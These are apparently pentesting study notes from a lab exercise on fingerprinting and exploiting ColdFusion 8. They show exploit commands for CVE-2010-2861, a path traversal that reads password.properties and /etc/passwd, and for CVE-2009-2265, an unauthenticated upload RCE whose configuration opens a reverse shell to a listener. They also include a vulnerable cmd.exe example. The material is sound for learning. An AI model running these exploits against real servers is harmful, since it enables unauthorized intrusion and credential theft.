# ColdFusion – Discovery and Attacking

## Overview

ColdFusion is both:

- a **web application development platform**
- a **programming environment** built around **CFML** (ColdFusion Markup Language)

It is Java-based and is commonly used to build dynamic web applications that integrate with:

- MySQL
- Oracle
- Microsoft SQL Server
- APIs
- mail services
- PDF generation
- graphing
- other backend services

ColdFusion was originally developed by **Allaire** in 1995, later acquired by **Macromedia**, and is now owned by **Adobe**.

## What CFML looks like

CFML is tag-based and looks similar to HTML.

### Query example

```html
<cfquery name="myQuery" datasource="myDataSource">
  SELECT *
  FROM myTable
</cfquery>
```

### Loop example

```html
<cfloop query="myQuery">
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```

This tag-driven style is one reason ColdFusion apps can be built quickly with relatively little code.

## Why it matters in pentesting

ColdFusion is less common than many modern stacks, but when you find it, it is often:

- old
- undermaintained
- highly privileged
- full of legacy functionality
- rich in admin interfaces and default content

Think of ColdFusion like an older enterprise app stack that often exposes far more surface area than it should.

---

# 1. Common Uses and Strengths

ColdFusion is commonly used for:

- data-driven web apps
- rapid application development
- database-heavy apps
- web content management
- business logic-heavy portals

## Benefits highlighted in the notes

- rapid development of dynamic applications
- easy DB integration
- simplified web content management
- good performance
- collaboration features for developers

ColdFusion supports:

- session management
- form handling
- AJAX features
- file upload handling
- email
- PDF manipulation
- graphing

---

# 2. Versions Mentioned

The notes mention:

- ColdFusion 2021
- ColdFusion 2018
- ColdFusion 2016
- ColdFusion 11

And in the lab scenario specifically:

- **ColdFusion 8**

This is important because ColdFusion 8 is old and has several well-known public exploit paths.

---

# 3. Typical Vulnerability Profile

Like many web-facing platforms, ColdFusion has historically been vulnerable to:

- SQL injection
- XSS
- directory traversal
- authentication bypass
- arbitrary file upload
- command injection

The notes list examples such as:

- `CVE-2021-21087`
- `CVE-2020-24453`
- `CVE-2020-24450`
- `CVE-2020-24449`
- `CVE-2019-15909`

For practical exploitation in the material provided, the key issues are:

- **CVE-2010-2861** – directory traversal
- **CVE-2009-2265** – unauthenticated RCE / file upload path in ColdFusion 8

---

# 4. Default Ports

ColdFusion can expose several ports by default.

| Port | Protocol | Description |
|---|---|---|
| 80 | HTTP | normal web traffic |
| 443 | HTTPS | secure web traffic |
| 1935 | RPC | client-server communication |
| 25 | SMTP | sending email |
| 8500 | SSL | ColdFusion web service / server communication |
| 5500 | Server Monitor | remote administration |

## Why this matters

During enumeration, **8500** is especially useful because it is a classic ColdFusion indicator.

Ports can be changed, but 8500 is a strong starting point.

---

# 5. Fingerprinting ColdFusion

Several clues can identify ColdFusion.

## Common indicators

- port `8500`
- `.cfm` file extensions
- `.cfc` file extensions
- headers like:
  - `Server: ColdFusion`
  - `X-Powered-By: ColdFusion`
- ColdFusion-specific error messages
- default files such as:
  - `admin.cfm`
  - `CFIDE/administrator/index.cfm`

---

# 6. Initial Enumeration

## Nmap example

```bash
nmap -p- -sC -Pn 10.129.247.30 --open
```

## Result from the notes

```text
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown
```

The important clue is:

- port `8500` open

The notes then browsed to:

```text
http://10.129.247.30:8500
```

and found:

- `CFIDE`
- `cfdocs`

These directories are classic ColdFusion indicators.

---

# 7. Confirming Version

Browsing around revealed:

- `.cfm` files
- error messages
- ColdFusion admin content

The most important path was:

```text
/CFIDE/administrator
```

This loaded the **ColdFusion 8 Administrator login page**.

At that point, versioning is effectively confirmed:

- **ColdFusion 8**

This is enough to justify checking known public exploits.

---

# 8. Searchsploit Triage

## Example

```bash
searchsploit adobe coldfusion
```

Among the many results, the two most important here are:

- `Adobe ColdFusion - Directory Traversal`
- `Adobe ColdFusion 8 - Remote Command Execution (RCE)`

These map to the practical exploit paths covered next.

---

# 9. Directory Traversal – Concept

Directory traversal (path traversal) lets an attacker read files outside the intended directory.

In ColdFusion, this can occur when file/directory operations do not validate input properly.

## Example vulnerable pattern

```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```

If input into the directory/file path is not properly validated, an attacker may be able to inject:

```text
../../../
```

to escape the intended directory.

---

# 10. CVE-2010-2861 – ColdFusion Directory Traversal

The notes identify **CVE-2010-2861** as the relevant traversal vulnerability.

Affected ColdFusion admin files include paths like:

- `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`

These endpoints can be abused through the `locale` parameter.

## Normal example

```text
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
```

## Traversal example

```text
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

In practice, the exploit script automates this.

---

# 11. Exploiting CVE-2010-2861

## Copy the exploit

```bash
searchsploit -p 14641
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
```

## Check usage

```bash
python2 14641.py
```

Usage from the notes:

```text
14641.py <host> <port> <file_path>
```

## Why `password.properties` matters

A particularly valuable target file is:

```text
[cf_root]/lib/password.properties
```

This file stores encrypted passwords used by ColdFusion for things like:

- database connections
- mail servers
- LDAP
- other authenticated resources

## Example exploitation

```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

## Result from the notes

The script successfully retrieved:

```text
rdspassword=...
password=...
encrypted=true
```

That proves:

- the target is vulnerable
- arbitrary file read is possible
- high-value config data can be extracted

---

# 12. Why `password.properties` Is Valuable

Even though values may be encrypted, this file is still very useful because it confirms:

- ColdFusion install path
- ColdFusion configuration state
- that the traversal works
- that credential material is exposed

It may also support later decryption or credential reuse efforts depending on the environment.

---

# 13. Unauthenticated RCE – Concept

Unauthenticated RCE means arbitrary code execution **without needing valid credentials**.

This is especially dangerous because:

- there is no barrier to entry
- no user account is required
- compromise can happen immediately from the network

The notes include a conceptual ColdFusion example using:

```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

This is dangerous because:

- user input is passed to `cmd.exe`
- no auth is required
- no proper validation is done

This is a general example, but the real exploit path in the notes is through an old ColdFusion 8 upload vulnerability.

---

# 14. CVE-2009-2265 – ColdFusion 8 Unauthenticated RCE

The vulnerable path is inside the bundled **FCKeditor** package:

```text
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

This flaw allows unauthenticated file upload and can be turned into remote code execution.

This is the exploit referred to in Searchsploit as:

- `Adobe ColdFusion 8 - Remote Command Execution (RCE)`

---

# 15. Pulling the RCE Exploit

## Copy exploit

```bash
searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

The script needs some variables edited first.

## Example configuration from the notes

```python
lhost = '10.10.14.55'
lport = 4444
rhost = "10.129.247.30"
rport = 8500
filename = uuid.uuid4().hex
```

This sets:

- your listener IP
- your listener port
- target IP
- target port
- random payload filename

---

# 16. Running the Exploit

## Example

```bash
python3 50057.py
```

## What it does

- generates a JSP payload
- uploads it through the vulnerable endpoint
- triggers the payload
- deletes the payload
- waits for a reverse connection

## Example output from the notes

```text
Generating a payload...
Saved as: <random>.jsp
Sending request...
Executing the payload...
Listening for connection...
```

Then:

```text
Connection from 10.129.247.30
```

That confirms successful exploitation.

---

# 17. Reverse Shell Result

The notes show a shell landing in:

```text
C:\ColdFusion8\runtime\bin
```

Example prompt/output:

```cmd
Microsoft Windows [Version 6.1.7600]
C:\ColdFusion8\runtime\bin>
```

Listing the directory confirms a real shell on the server.

This is a full unauthenticated RCE path against an old ColdFusion target.

---

# 18. Practical Workflow

## Step 1 – identify ColdFusion

Look for:

- port `8500`
- `CFIDE`
- `cfdocs`
- `.cfm` pages
- ColdFusion admin pages

## Step 2 – confirm version

Check:

```text
/CFIDE/administrator
```

If it shows ColdFusion 8, public exploit paths are immediately relevant.

## Step 3 – search for public exploit paths

Use:

```bash
searchsploit adobe coldfusion
```

## Step 4 – try directory traversal

Use `14641.py` against a target like:

```text
ColdFusion8/lib/password.properties
```

## Step 5 – if ColdFusion 8 is present, assess upload/RCE path

Use the FCKeditor upload flaw via `50057.py`.

## Step 6 – catch shell and enumerate

Once in, pivot to:

- credentials
- configs
- services
- privesc
- lateral movement

---

# 19. Useful Commands

## Nmap

```bash
nmap -p- -sC -Pn 10.129.247.30 --open
```

## Searchsploit

```bash
searchsploit adobe coldfusion
```

## Copy traversal exploit

```bash
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
```

## Run traversal exploit

```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

## Copy RCE exploit

```bash
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

## Run RCE exploit

```bash
python3 50057.py
```

---

# 20. Key Takeaways

- ColdFusion is easy to fingerprint when default content such as `CFIDE` and `cfdocs` is exposed
- port `8500` is a strong indicator
- ColdFusion 8 is old and has powerful public exploit paths
- **CVE-2010-2861** provides arbitrary file read via path traversal
- `password.properties` is a particularly valuable traversal target
- **CVE-2009-2265** can provide unauthenticated RCE through the bundled FCKeditor upload path
- once exploited, ColdFusion often yields an immediate Windows shell

---

# Tags

#coldfusion
#cfml
#cfide
#fckeditor
#directory-traversal
#unauthenticated-rce
#cve-2010-2861
#cve-2009-2265
#windows
#attacking-common-apps
#pentesting
#ctf
#obsidian